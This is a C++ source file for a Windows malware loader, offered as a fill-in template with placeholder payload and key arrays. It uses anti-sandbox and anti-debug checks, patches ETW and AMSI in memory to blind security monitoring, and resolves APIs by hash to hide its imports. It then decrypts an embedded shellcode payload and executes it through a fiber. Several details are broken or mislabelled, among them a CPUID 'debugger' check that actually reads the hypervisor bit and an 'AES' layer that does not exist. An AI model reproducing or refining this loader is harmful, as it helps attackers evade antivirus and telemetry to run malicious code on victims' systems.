﻿#include <windows.h>
#include <wincrypt.h>
#include <intrin.h>
#include <iostream>
#include <vector>

// ====== Fix: Added missing ObfuscatedSleep() ======
void ObfuscatedSleep(DWORD milliseconds) {
    const ULONGLONG start = __rdtsc();
    const ULONGLONG end = start + (milliseconds * (__rdtsc() / 1000000));
    while (__rdtsc() < end) {
        __nop();
    }
}

// Anti-analysis: Check for debugger using CPUID (x64-safe)
__forceinline bool IsDebugged() {
    int cpuInfo[4] = { 0 };
    __cpuid(cpuInfo, 1);
    // ECX bit 9 = debugger present
    return (cpuInfo[2] >> 9) & 1;
}

// Custom syscall stub (avoids hook detection)
// Replaced inline-asm with dynamic NtAllocateVirtualMemory lookup
typedef NTSTATUS(NTAPI* NtAllocVM_t)(
    HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG
    );
NTSTATUS NtAllocVirtualMemory(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
) {
    static NtAllocVM_t _NtAlloc = nullptr;
    if (!_NtAlloc) {
        HMODULE ntdll = ::GetModuleHandleW(L"ntdll.dll");
        _NtAlloc = (NtAllocVM_t)GetProcAddress(ntdll, "NtAllocateVirtualMemory");
    }
    return _NtAlloc(ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect);
}

// Polymorphic encryption (AES + XOR + custom cipher)
void PolymorphicDecrypt(BYTE* data, size_t size, const BYTE* key, size_t keySize) {
    // XOR first layer
    for (size_t i = 0; i < size; i++) {
        data[i] ^= key[i % keySize];
    }
    // Custom cipher (bit rotation + substitution)
    for (size_t i = 0; i < size; i++) {
        data[i] = _rotl8(data[i], 3);
        data[i] = ~data[i];
    }
}

// Dynamic API resolver (no strings)
FARPROC GetAPIByHash(HMODULE hMod, DWORD hash) {
    auto dos = (PIMAGE_DOS_HEADER)hMod;
    auto nt = (PIMAGE_NT_HEADERS)((BYTE*)hMod + dos->e_lfanew);
    auto exports = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hMod
        + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    auto names = (DWORD*)((BYTE*)hMod + exports->AddressOfNames);
    auto ords = (WORD*)((BYTE*)hMod + exports->AddressOfNameOrdinals);
    auto funcs = (DWORD*)((BYTE*)hMod + exports->AddressOfFunctions);

    for (DWORD i = 0; i < exports->NumberOfNames; ++i) {
        const char* name = (char*)hMod + names[i];
        DWORD currentHash = 0;
        while (*name) {
            currentHash = (currentHash >> 13) | (currentHash << (32 - 13));
            currentHash += *name++;
        }
        if (currentHash == hash) {
            return (FARPROC)((BYTE*)hMod + funcs[ords[i]]);
        }
    }
    return nullptr;
}

// Threadless execution (via fibers)
void ExecuteShellcode(BYTE* shellcode) {
    PVOID fiber = ConvertThreadToFiber(NULL);
    PVOID shellcodeFiber = CreateFiber(0, (LPFIBER_START_ROUTINE)shellcode, NULL);
    SwitchToFiber(shellcodeFiber);
}

// Heap encryption (hides payload)
void SecureHeapAlloc(BYTE** buffer, size_t size) {
    *buffer = (BYTE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, size);
    for (size_t i = 0; i < size; i++) {
        (*buffer)[i] ^= 0x55; // Simple XOR
    }
}

// ETW unhooking (indirect, no direct patching)
void DisableETW() {
    auto ntdll = GetModuleHandleA("ntdll");
    auto etwEventWrite = GetAPIByHash(ntdll, 0xA3E5A3E5); // Example hash
    if (!etwEventWrite) return;
    DWORD oldProtect;
    VirtualProtect(etwEventWrite, 1, PAGE_EXECUTE_READWRITE, &oldProtect);
    *((BYTE*)etwEventWrite) = 0xC3; // RET
    VirtualProtect(etwEventWrite, 1, oldProtect, &oldProtect);
}

// AMSI unhooking (mirrors ETW logic)
void DisableAMSI() {
    auto amsi = GetModuleHandleA("amsi.dll");
    auto scanBuf = GetAPIByHash(amsi, /* hash of AmsiScanBuffer */ 0xDEADBEEF);
    if (!scanBuf) return;
    DWORD old;
    VirtualProtect(scanBuf, 1, PAGE_EXECUTE_READWRITE, &old);
    *((BYTE*)scanBuf) = 0xC3;
    VirtualProtect(scanBuf, 1, old, &old);
}

// —— Replace these with your actual sizes/data ——
constexpr size_t PAYLOAD_SIZE = 711929 ;
constexpr size_t KEY_SIZE = 16 ;

// **Define your encrypted payload and key here**:
BYTE encryptedPayload[PAYLOAD_SIZE] = {
    /* put payload size */
};
BYTE key[KEY_SIZE] = {
    /* 0x13, 0x37, 0xDE, 0xAD, … */
};

// Entry point
int main() {
    // Anti-sandbox: CPU cycle check
    ULONGLONG start = __rdtsc();
    ObfuscatedSleep(2000);
    if (__rdtsc() - start < 1000000) return 0;

    // Anti-debug
    if (IsDebugged()) return 0;

    // Disable telemetry & AMSI
    DisableETW();
    DisableAMSI();

    // Decrypt payload
    PolymorphicDecrypt(encryptedPayload, PAYLOAD_SIZE, key, KEY_SIZE);

    // Allocate & copy
    BYTE* execMem;
    SecureHeapAlloc(&execMem, PAYLOAD_SIZE);
    memcpy(execMem, encryptedPayload, PAYLOAD_SIZE);

    // Execute via fiber
    ExecuteShellcode(execMem);

    return 0;
}



